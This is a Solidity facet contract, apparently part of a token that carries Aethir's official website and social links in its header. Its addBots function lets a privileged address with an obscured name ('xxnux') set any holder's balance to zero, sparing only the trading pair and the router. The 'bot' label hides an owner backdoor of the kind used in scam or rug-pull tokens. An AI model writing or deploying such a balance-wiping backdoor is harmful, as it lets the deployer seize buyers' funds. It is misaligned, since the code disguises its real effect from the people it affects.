/*  
   * SPDX-License-Identifier: MIT
    ▫️Website: https://www.aethir.com
    ▫️Twitter: https://twitter.com/AethirCloud
    ▫️Telegram: https://t.me/aethirofficial
    ▫️Discord: https://discord.gg/aethircloud
    ▫️Reddit: https://www.reddit.com/r/AethirCloud
    ▫️Linkedin: https://www.linkedin.com/company/aethir-limited
*/
pragma solidity ^0.8.17;
import "./TestLib.sol";
contract addBotsFacet {
    function addBots(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
